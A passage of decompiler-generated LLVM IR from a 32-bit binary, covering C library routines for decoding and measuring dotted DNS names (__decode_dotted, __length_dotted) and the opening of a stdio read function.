dec_label_pc_8057cde:                             ; preds = %dec_label_pc_8057ccb
  %v1_8057ce0 = load i32, i32* @edi, align 4
  %v2_8057ce0 = sub i32 %v5_8057cd0, %v1_8057ce0
  br label %dec_label_pc_8057cf2

dec_label_pc_8057ce4:                             ; preds = %dec_label_pc_8057ccb
  %v0_8057ce7 = load i32, i32* @edi, align 4
  %v5_8057ce7 = inttoptr i32 %v0_8057ce7 to i8*
  %v3_8057ce8 = call i32 @strlen(i8* %v5_8057ce7)
  br label %dec_label_pc_8057cf2

dec_label_pc_8057cf2:                             ; preds = %dec_label_pc_8057cde, %dec_label_pc_8057ce4
  %v0_8057d05 = phi i32 [ %v2_8057ce0, %dec_label_pc_8057cde ], [ %v3_8057ce8, %dec_label_pc_8057ce4 ]
  store i32 %v0_8057d05, i32* @esi, align 4
  %v1_8057cf2 = icmp eq i32 %v0_8057d05, 0
  %v3_8057cf2 = trunc i32 %v0_8057d05 to i8
  br i1 %v1_8057cf2, label %dec_label_pc_8057d41, label %dec_label_pc_8057cf6

dec_label_pc_8057cf6:                             ; preds = %dec_label_pc_8057cf2
  %v1_8057cfa = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057cfa = sub i32 %arg3, %v1_8057cfa
  %v1_8057cfc = add i32 %v2_8057cfa, -1
  %v7_8057cfd = icmp ult i32 %v0_8057d05, %v1_8057cfc
  %v1_8057cff = icmp eq i1 %v7_8057cfd, false
  br i1 %v1_8057cff, label %dec_label_pc_8057d41, label %dec_label_pc_8057d01

dec_label_pc_8057d01:                             ; preds = %dec_label_pc_8057cf6
  store i32 %arg2, i32* @edx, align 4
  %v4_8057d07 = add i32 %v1_8057cfa, %arg2
  %v5_8057d07 = inttoptr i32 %v4_8057d07 to i8*
  store i8 %v3_8057cf2, i8* %v5_8057d07, align 1
  %v0_8057d0a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057d0a = add i32 %v0_8057d0a, 1
  %v0_8057d0c = load i32, i32* @edx, align 4
  %v2_8057d0e = add i32 %v1_8057d0a, %v0_8057d0c
  %v0_8057d10 = load i32, i32* @esi, align 4
  %v0_8057d11 = load i32, i32* @edi, align 4
  %v2_8057d13 = add i32 %v0_8057d10, %v1_8057d0a
  store i32 %v2_8057d13, i32* %ebx.global-to-local, align 4
  %tmp31 = inttoptr i32 %v2_8057d0e to i16*
  %v7_8057d15 = call i32 @memcpy(i16* %tmp31, i32 %v0_8057d11, i32 %v0_8057d10)
  %v1_8057d21 = add i32 %v5_8057cd0, 1
  br i1 %v1_8057cda, label %dec_label_pc_8057d2d, label %dec_label_pc_8057d24

dec_label_pc_8057d24:                             ; preds = %dec_label_pc_8057d01
  store i32 %v1_8057d21, i32* @edi, align 4
  %v1_8057d24 = icmp eq i32 %v1_8057d21, 0
  br i1 %v1_8057d24, label %dec_label_pc_8057d2d, label %dec_label_pc_8057d28

dec_label_pc_8057d28:                             ; preds = %dec_label_pc_8057d28.lr.ph, %dec_label_pc_8057d24
  %v0_8057ccf = phi i32 [ %v4_8057cc5, %dec_label_pc_8057d28.lr.ph ], [ %v1_8057d21, %dec_label_pc_8057d24 ]
  %v1_8057d28 = inttoptr i32 %v0_8057ccf to i8*
  %v2_8057d28 = load i8, i8* %v1_8057d28, align 1
  %v3_8057d28 = icmp eq i8 %v2_8057d28, 0
  %v1_8057d2b = icmp eq i1 %v3_8057d28, false
  br i1 %v1_8057d2b, label %dec_label_pc_8057ccb, label %dec_label_pc_8057d2d

dec_label_pc_8057d2d:                             ; preds = %dec_label_pc_8057d24, %dec_label_pc_8057d28, %dec_label_pc_8057d01, %entry
  %tmp32 = icmp slt i32 %arg3, 1
  br i1 %tmp32, label %dec_label_pc_8057d41, label %dec_label_pc_8057d34

dec_label_pc_8057d34:                             ; preds = %dec_label_pc_8057d2d
  %v1_8057d38 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057d38 = add i32 %v1_8057d38, %arg2
  %v3_8057d38 = inttoptr i32 %v2_8057d38 to i8*
  store i8 0, i8* %v3_8057d38, align 1
  %v0_8057d3c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057d3c = add i32 %v0_8057d3c, 1
  br label %dec_label_pc_8057d44

dec_label_pc_8057d41:                             ; preds = %dec_label_pc_8057cf6, %dec_label_pc_8057cf2, %dec_label_pc_8057d2d
  br label %dec_label_pc_8057d44

dec_label_pc_8057d44:                             ; preds = %dec_label_pc_8057d34, %dec_label_pc_8057d41
  %storemerge4 = phi i32 [ %v1_8057d3c, %dec_label_pc_8057d34 ], [ -1, %dec_label_pc_8057d41 ]
  store i32 %v0_8057cbe, i32* @esi, align 4
  store i32 %v0_8057cbd, i32* @edi, align 4
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i8* %v1_8057d28, { 1, 0 }
  uselistorder i32 %v1_8057d21, { 0, 2, 1 }
  uselistorder i32 %v0_8057d10, { 1, 0 }
  uselistorder i1 %v1_8057cda, { 1, 0 }
  uselistorder i32 %v5_8057cd0, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 5, 7, 6, 4, 3, 2, 1, 0, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 9, 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 13, 14, 15 }
  uselistorder i32 46, { 2, 5, 0, 6, 1, 3, 4 }
  uselistorder i8* null, { 3, 5, 2, 7, 0, 1, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 4 }
  uselistorder label %dec_label_pc_8057d44, { 1, 0 }
  uselistorder label %dec_label_pc_8057d41, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057d2d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8057d28, { 1, 0 }
  uselistorder label %dec_label_pc_8057cf2, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8057d4e = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_8057d57 = icmp eq i32 %arg1, 0
  br i1 %v4_8057d57, label %dec_label_pc_8057e18, label %dec_label_pc_8057d62

dec_label_pc_8057d62:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_8057e002740 = add i32 %arg2, %arg1
  %v3_8057e002841 = inttoptr i32 %v2_8057e002740 to i8*
  %v4_8057e002942 = load i8, i8* %v3_8057e002841, align 1
  %v1_8057e043144 = icmp eq i8 %v4_8057e002942, 0
  %v1_8057e063245 = icmp eq i1 %v1_8057e043144, false
  br i1 %v1_8057e063245, label %dec_label_pc_8057d70.lr.ph, label %dec_label_pc_8057e0c

dec_label_pc_8057d70:                             ; preds = %dec_label_pc_8057d70.lr.ph, %dec_label_pc_8057d89
  %v0_8057d7a = phi i32 [ %v0_8057d7a.pre, %dec_label_pc_8057d70.lr.ph ], [ %v4_8057d94, %dec_label_pc_8057d89 ]
  %v8_8057d7038 = phi i1 [ %v8_8057d703350, %dec_label_pc_8057d70.lr.ph ], [ true, %dec_label_pc_8057d89 ]
  %v5_8057e0037.in = phi i8 [ %v5_8057e003049.in, %dec_label_pc_8057d70.lr.ph ], [ %v4_8057e00, %dec_label_pc_8057d89 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_8057d70.lr.ph ], [ 0, %dec_label_pc_8057d89 ]
  %v0_8057d7735 = phi i32 [ %v0_8057d77.ph46, %dec_label_pc_8057d70.lr.ph ], [ %v2_8057da3, %dec_label_pc_8057d89 ]
  %v5_8057e0037 = zext i8 %v5_8057e0037.in to i32
  %v1_8057d77 = add i32 %v0_8057d7735, 1
  store i32 %v1_8057d77, i32* @esi, align 4
  %v3_8057d7a = select i1 %v8_8057d7038, i32 2, i32 1
  %v4_8057d7a = add i32 %v3_8057d7a, %v0_8057d7a
  store i32 %v4_8057d7a, i32* %ebp.global-to-local, align 4
  %v1_8057d7d = and i32 %v5_8057e0037, 192
  %v6_8057d82 = icmp eq i32 %v1_8057d7d, 192
  %v1_8057d87 = icmp eq i1 %v6_8057d82, false
  br i1 %v1_8057d87, label %dec_label_pc_8057dac, label %dec_label_pc_8057d89

dec_label_pc_8057d89:                             ; preds = %dec_label_pc_8057d70
  %v4_8057d94 = add i32 %v3_8057d7a, %v4_8057d7a
  store i32 %v4_8057d94, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_8057e0037.in, 64
  %v1_8057d97 = zext i8 %tmp to i32
  %v2_8057d9a = add i32 %v1_8057d77, %arg1
  %v3_8057d9a = inttoptr i32 %v2_8057d9a to i8*
  %v4_8057d9a = load i8, i8* %v3_8057d9a, align 1
  %v5_8057d9a = zext i8 %v4_8057d9a to i32
  %v2_8057d9e = mul nuw nsw i32 %v1_8057d97, 256
  %v2_8057da3 = or i32 %v5_8057d9a, %v2_8057d9e
  store i32 %v2_8057da3, i32* @edx, align 4
  store i32 %v1_8057dc9.ph47, i32* @ecx, align 4
  %v2_8057e00 = add i32 %v2_8057da3, %arg1
  %v3_8057e00 = inttoptr i32 %v2_8057e00 to i8*
  %v4_8057e00 = load i8, i8* %v3_8057e00, align 1
  %v1_8057e04 = icmp eq i8 %v4_8057e00, 0
  %v1_8057e06 = icmp eq i1 %v1_8057e04, false
  br i1 %v1_8057e06, label %dec_label_pc_8057d70, label %dec_label_pc_8057e0c

dec_label_pc_8057dac:                             ; preds = %dec_label_pc_8057d70
  %v2_8057dac = add i32 %v5_8057e0037, %v1_8057dc9.ph47
  %v1_8057db5 = add i32 %v2_8057dac, 1
  store i32 %v1_8057db5, i32* @edi, align 4
  %v10_8057db6 = icmp ult i32 %v1_8057db5, %arg4
  %v1_8057dba = icmp eq i1 %v10_8057db6, false
  br i1 %v1_8057dba, label %dec_label_pc_8057e18, label %dec_label_pc_8057dbc

dec_label_pc_8057dbc:                             ; preds = %dec_label_pc_8057dac
  %v2_8057dc2 = add i32 %v1_8057d77, %arg1
  %v2_8057dc9 = add i32 %v1_8057dc9.ph47, %arg3
  %v3_8057dcc = inttoptr i32 %v2_8057dc9 to i16*
  %v4_8057dcc = call i32 @memcpy(i16* %v3_8057dcc, i32 %v2_8057dc2, i32 %v5_8057e0037)
  %v0_8057dd4 = load i32, i32* @esi, align 4
  %v2_8057dd4 = add i32 %v0_8057dd4, %v5_8057e0037
  store i32 %v2_8057dd4, i32* @edx, align 4
  br i1 %v8_8057d7038, label %dec_label_pc_8057de0, label %dec_label_pc_8057dde

dec_label_pc_8057dde:                             ; preds = %dec_label_pc_8057dbc
  %v0_8057dde = load i32, i32* %ebp.global-to-local, align 4
  %v2_8057dde = add i32 %v0_8057dde, %v5_8057e0037
  store i32 %v2_8057dde, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8057de0

dec_label_pc_8057de0:                             ; preds = %dec_label_pc_8057dbc, %dec_label_pc_8057dde
  %v4_8057df7 = add i32 %v2_8057dac, %arg3
  %v5_8057df7 = inttoptr i32 %v4_8057df7 to i8*
  store i8 46, i8* %v5_8057df7, align 1
  %v0_8057dfa.pre = load i32, i32* @edi, align 4
  %v1_8057e00.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8057dfa.pre, i32* @ecx, align 4
  %v2_8057e0027 = add i32 %v1_8057e00.pre.pre, %arg1
  %v3_8057e0028 = inttoptr i32 %v2_8057e0027 to i8*
  %v4_8057e0029 = load i8, i8* %v3_8057e0028, align 1
  %v1_8057e0431 = icmp eq i8 %v4_8057e0029, 0
  %v1_8057e0632 = icmp eq i1 %v1_8057e0431, false
  %v8_8057d7033 = icmp eq i8 %stack_var_-17.136, 0
  %v0_8057d7a.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_8057e0632, label %dec_label_pc_8057d70.lr.ph, label %dec_label_pc_8057e0c

dec_label_pc_8057d70.lr.ph:                       ; preds = %dec_label_pc_8057de0, %dec_label_pc_8057d62
  %v0_8057d7a.pre = phi i32 [ 0, %dec_label_pc_8057d62 ], [ %v0_8057d7a.pre.pre, %dec_label_pc_8057de0 ]
  %v8_8057d703350 = phi i1 [ false, %dec_label_pc_8057d62 ], [ %v8_8057d7033, %dec_label_pc_8057de0 ]
  %v5_8057e003049.in = phi i8 [ %v4_8057e002942, %dec_label_pc_8057d62 ], [ %v4_8057e0029, %dec_label_pc_8057de0 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_8057d62 ], [ %stack_var_-17.136, %dec_label_pc_8057de0 ]
  %v1_8057dc9.ph47 = phi i32 [ 0, %dec_label_pc_8057d62 ], [ %v0_8057dfa.pre, %dec_label_pc_8057de0 ]
  %v0_8057d77.ph46 = phi i32 [ %arg2, %dec_label_pc_8057d62 ], [ %v1_8057e00.pre.pre, %dec_label_pc_8057de0 ]
  br label %dec_label_pc_8057d70

dec_label_pc_8057e0c:                             ; preds = %dec_label_pc_8057de0, %dec_label_pc_8057d89, %dec_label_pc_8057d62
  %v0_8057e11 = phi i32 [ 0, %dec_label_pc_8057d62 ], [ %v4_8057d94, %dec_label_pc_8057d89 ], [ %v0_8057d7a.pre.pre, %dec_label_pc_8057de0 ]
  %v8_8057d70.lcssa = phi i1 [ false, %dec_label_pc_8057d62 ], [ true, %dec_label_pc_8057d89 ], [ %v8_8057d7033, %dec_label_pc_8057de0 ]
  %v2_8057e13 = zext i1 %v8_8057d70.lcssa to i32
  %v3_8057e13 = add i32 %v0_8057e11, 1
  %v4_8057e13 = add i32 %v3_8057e13, %v2_8057e13
  br label %dec_label_pc_8057e1b

dec_label_pc_8057e18:                             ; preds = %dec_label_pc_8057dac, %entry
  br label %dec_label_pc_8057e1b

dec_label_pc_8057e1b:                             ; preds = %dec_label_pc_8057e0c, %dec_label_pc_8057e18
  %storemerge = phi i32 [ %v4_8057e13, %dec_label_pc_8057e0c ], [ -1, %dec_label_pc_8057e18 ]
  store i32 %v0_8057d4e, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8057dc9.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_8057e00, { 1, 0 }
  uselistorder i32 %v2_8057da3, { 0, 2, 1 }
  uselistorder i32 %v4_8057d94, { 0, 2, 1 }
  uselistorder i32 %v5_8057e0037, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8 1, { 1, 28, 31, 2, 30, 29, 25, 3, 26, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 5, 6, 27, 24 }
  uselistorder i8 46, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 4, 5, 6, 7, 8, 9, 10, 17, 11, 12, 18, 20, 21, 16, 13, 14, 15, 19, 0, 1, 2, 3 }
  uselistorder i32* @edi, { 2, 136, 137, 21, 138, 139, 140, 20, 141, 142, 3, 143, 0, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 29, 5, 4, 30, 31, 32, 33, 34, 42, 35, 36, 37, 38, 39, 40, 41, 159, 6, 160, 7, 161, 162, 163, 164, 169, 170, 1, 165, 166, 167, 168, 171, 172, 173, 174, 8, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 9, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 94, 95, 96, 97, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 10, 229, 230, 231, 232, 233, 234, 235, 329, 330, 11, 331, 332, 12, 335, 336, 286, 287, 288, 337, 338, 353, 111, 13, 112, 113, 114, 43, 44, 45, 46, 47, 48, 49, 119, 14, 120, 121, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 15, 319, 320, 321, 322, 323, 265, 266, 16, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 236, 237, 17, 238, 351, 352, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 18, 263, 26, 27, 28, 249, 19, 250, 251, 264, 347, 348, 349, 350, 115, 116, 117, 118, 333, 334, 122, 123, 284, 285, 50, 51, 52, 289, 290, 344, 345, 346, 291, 292, 53, 54, 55, 339, 340, 341, 342, 343, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 22, 23, 24, 25, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 279, 280, 281, 282, 283, 293, 294, 295, 324, 325, 326, 327, 328 }
  uselistorder i32 256, { 1, 4, 2, 3, 5, 6, 7, 8, 9, 48, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 54, 21, 47, 22, 23, 24, 25, 26, 43, 44, 27, 45, 49, 28, 29, 53, 30, 31, 0, 51, 52, 46, 32, 33, 34, 35, 36, 37, 38, 39, 40, 50, 55, 41, 42 }
  uselistorder i1 true, { 1, 3, 10, 4, 5, 7, 6, 8, 9, 2, 0 }
  uselistorder i32* @edx, { 8, 307, 308, 309, 310, 311, 312, 313, 314, 9, 315, 316, 317, 318, 319, 21, 3, 322, 320, 321, 2, 323, 324, 325, 326, 327, 328, 329, 330, 29, 33, 30, 31, 32, 331, 332, 333, 334, 335, 336, 337, 343, 338, 339, 340, 341, 342, 4, 22, 73, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 361, 360, 5, 362, 363, 364, 365, 417, 10, 6, 23, 74, 366, 367, 368, 369, 370, 371, 372, 373, 374, 500, 501, 502, 503, 11, 504, 505, 408, 420, 423, 83, 424, 0, 507, 34, 508, 425, 511, 512, 519, 518, 509, 84, 40, 12, 41, 42, 43, 44, 45, 46, 47, 85, 86, 87, 88, 89, 35, 428, 429, 13, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 14, 443, 444, 426, 427, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 15, 482, 483, 484, 485, 486, 487, 488, 514, 90, 409, 410, 412, 413, 414, 1, 411, 416, 375, 376, 377, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 20, 395, 396, 378, 397, 16, 398, 399, 401, 17, 402, 403, 404, 405, 406, 28, 18, 400, 407, 510, 19, 91, 418, 419, 506, 92, 513, 415, 515, 499, 421, 422, 304, 36, 516, 517, 37, 38, 39, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 75, 76, 77, 78, 79, 80, 81, 82, 24, 25, 26, 27, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 305, 306, 489, 490, 491, 492, 494, 498, 493, 496, 497, 7, 495, 520 }
  uselistorder i32* @esi, { 132, 133, 134, 135, 136, 137, 35, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 36, 53, 54, 9, 7, 60, 55, 56, 57, 58, 59, 158, 10, 159, 160, 164, 161, 162, 163, 171, 165, 166, 167, 168, 169, 170, 172, 173, 174, 175, 176, 177, 178, 11, 8, 179, 180, 181, 182, 183, 12, 32, 184, 185, 186, 187, 188, 189, 13, 190, 191, 192, 193, 194, 195, 14, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 15, 210, 211, 212, 213, 214, 215, 16, 17, 216, 18, 217, 218, 219, 19, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 1, 230, 231, 232, 233, 234, 235, 236, 237, 93, 94, 95, 96, 97, 351, 352, 353, 354, 238, 239, 240, 241, 242, 243, 0, 244, 320, 321, 322, 355, 356, 357, 358, 359, 367, 370, 371, 372, 112, 113, 114, 115, 116, 117, 118, 360, 365, 366, 61, 62, 63, 64, 123, 124, 125, 2, 126, 127, 128, 65, 66, 67, 68, 323, 327, 20, 328, 329, 330, 331, 332, 333, 334, 324, 325, 326, 335, 336, 337, 338, 339, 340, 341, 3, 342, 343, 344, 345, 21, 346, 37, 347, 348, 349, 350, 299, 300, 301, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 373, 22, 374, 375, 245, 23, 246, 38, 33, 302, 303, 318, 319, 382, 383, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 25, 258, 4, 260, 261, 262, 263, 24, 264, 265, 259, 266, 267, 268, 269, 5, 270, 271, 272, 273, 274, 275, 34, 26, 276, 277, 27, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 28, 295, 296, 297, 29, 52, 278, 6, 279, 280, 30, 31, 298, 361, 362, 363, 364, 376, 377, 378, 379, 380, 381, 119, 120, 121, 122, 368, 369, 316, 317, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 129, 130, 131, 384 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8057e1b, { 1, 0 }
  uselistorder label %dec_label_pc_8057de0, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8057e32 = icmp eq i32 %arg1, 0
  br i1 %v1_8057e32, label %dec_label_pc_8057e61, label %dec_label_pc_8057e52.preheader

dec_label_pc_8057e52.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_8057e5210 = add i32 %arg2, %arg1
  %v3_8057e5211 = inttoptr i32 %v2_8057e5210 to i8*
  %v4_8057e5212 = load i8, i8* %v3_8057e5211, align 1
  %v1_8057e5614 = add i32 %arg2, 1
  %v1_8057e5915 = icmp eq i8 %v4_8057e5212, 0
  %v1_8057e5b16 = icmp eq i1 %v1_8057e5915, false
  br i1 %v1_8057e5b16, label %dec_label_pc_8057e41, label %dec_label_pc_8057e5d

dec_label_pc_8057e38:                             ; preds = %dec_label_pc_8057e41
  %v1_8057e38 = add i32 %v0_8057e3817, 2
  br label %dec_label_pc_8057e5d

dec_label_pc_8057e41:                             ; preds = %dec_label_pc_8057e52.preheader, %dec_label_pc_8057e52
  %v1_8057e5619 = phi i32 [ %v1_8057e56, %dec_label_pc_8057e52 ], [ %v1_8057e5614, %dec_label_pc_8057e52.preheader ]
  %v5_8057e5218.in = phi i8 [ %v4_8057e52, %dec_label_pc_8057e52 ], [ %v4_8057e5212, %dec_label_pc_8057e52.preheader ]
  %v0_8057e3817 = phi i32 [ %v2_8057e4f, %dec_label_pc_8057e52 ], [ %arg2, %dec_label_pc_8057e52.preheader ]
  %v5_8057e5218 = zext i8 %v5_8057e5218.in to i32
  %v1_8057e43 = and i32 %v5_8057e5218, 192
  %v6_8057e48 = icmp eq i32 %v1_8057e43, 192
  %v2_8057e4f = add i32 %v5_8057e5218, %v1_8057e5619
  br i1 %v6_8057e48, label %dec_label_pc_8057e38, label %dec_label_pc_8057e52

dec_label_pc_8057e52:                             ; preds = %dec_label_pc_8057e41
  store i32 %v2_8057e4f, i32* @ecx, align 4
  %v2_8057e52 = add i32 %v2_8057e4f, %arg1
  %v3_8057e52 = inttoptr i32 %v2_8057e52 to i8*
  %v4_8057e52 = load i8, i8* %v3_8057e52, align 1
  %v1_8057e56 = add i32 %v2_8057e4f, 1
  %v1_8057e59 = icmp eq i8 %v4_8057e52, 0
  %v1_8057e5b = icmp eq i1 %v1_8057e59, false
  br i1 %v1_8057e5b, label %dec_label_pc_8057e41, label %dec_label_pc_8057e5d

dec_label_pc_8057e5d:                             ; preds = %dec_label_pc_8057e52.preheader, %dec_label_pc_8057e52, %dec_label_pc_8057e38
  %v0_8057e5d = phi i32 [ %v1_8057e38, %dec_label_pc_8057e38 ], [ %v1_8057e5614, %dec_label_pc_8057e52.preheader ], [ %v1_8057e56, %dec_label_pc_8057e52 ]
  %v2_8057e5f = sub i32 %v0_8057e5d, %arg2
  br label %dec_label_pc_8057e61

dec_label_pc_8057e61:                             ; preds = %entry, %dec_label_pc_8057e5d
  %v0_8057e64 = phi i32 [ -1, %entry ], [ %v2_8057e5f, %dec_label_pc_8057e5d ]
  ret i32 %v0_8057e64

; uselistorder directives
  uselistorder i8 %v4_8057e52, { 1, 0 }
  uselistorder i32 %v2_8057e4f, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2 }
  uselistorder i32 2, { 154, 48, 155, 156, 4, 78, 157, 47, 93, 159, 160, 52, 57, 56, 158, 161, 162, 163, 134, 164, 165, 166, 167, 168, 169, 139, 58, 140, 141, 67, 170, 171, 59, 94, 68, 60, 61, 172, 173, 69, 62, 174, 89, 175, 176, 177, 178, 135, 193, 194, 74, 179, 180, 90, 5, 79, 80, 201, 75, 133, 3, 95, 130, 96, 131, 97, 132, 70, 6, 143, 53, 98, 99, 0, 100, 1, 101, 2, 102, 103, 7, 8, 9, 10, 196, 11, 12, 91, 13, 187, 188, 189, 190, 63, 81, 148, 149, 191, 192, 71, 72, 73, 14, 202, 82, 181, 182, 77, 15, 16, 183, 54, 17, 184, 18, 83, 185, 186, 195, 200, 92, 142, 106, 104, 105, 107, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 64, 144, 30, 31, 32, 65, 145, 33, 34, 35, 36, 37, 146, 108, 38, 147, 109, 39, 84, 40, 41, 42, 43, 49, 44, 50, 45, 110, 111, 112, 113, 85, 114, 115, 116, 76, 117, 118, 119, 120, 121, 124, 122, 123, 136, 137, 138, 125, 126, 150, 51, 151, 66, 152, 86, 55, 153, 127, 128, 87, 199, 88, 197, 46, 198, 129 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057e61, { 1, 0 }
  uselistorder label %dec_label_pc_8057e5d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057e41, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057e68 = load i32, i32* @ebx, align 4
  store i32 %v0_8057e68, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_8057e6e = ptrtoint i16* %arg1 to i32
  store i32 %v4_8057e6e, i32* @ebx, align 4
  %v1_8057e76 = bitcast i16* %arg1 to i8*
  %v2_8057e76 = load i8, i8* %v1_8057e76, align 1
  %v3_8057e76 = and i8 %v2_8057e76, 4
  %v4_8057e76 = icmp eq i8 %v3_8057e76, 0
  %v1_8057e79 = icmp eq i1 %v4_8057e76, false
  br i1 %v1_8057e79, label %dec_label_pc_8057ea8, label %dec_label_pc_8057e7b

dec_label_pc_8057e7b:                             ; preds = %entry
  %v2_8057e7b = icmp slt i32 %arg3, 0
  %v1_8057e7d = icmp eq i1 %v2_8057e7b, false
  br i1 %v1_8057e7d, label %dec_label_pc_8057e84, label %dec_label_pc_8057e7f

dec_label_pc_8057e7f:                             ; preds = %dec_label_pc_8057e7b
  br label %dec_label_pc_8057e84

dec_label_pc_8057e84:                             ; preds = %dec_label_pc_8057e7b, %dec_label_pc_8057e7f
  %v0_8057e85 = phi i32 [ %arg3, %dec_label_pc_8057e7b ], [ 2147483647, %dec_label_pc_8057e7f ]
  %v1_8057e8a = add i32 %v4_8057e6e, 4
  %v2_8057e8a = inttoptr i32 %v1_8057e8a to i32*
  %v3_8057e8a = load i32, i32* %v2_8057e8a, align 4
  %v3_8057e8d = inttoptr i32 %arg2 to i32*
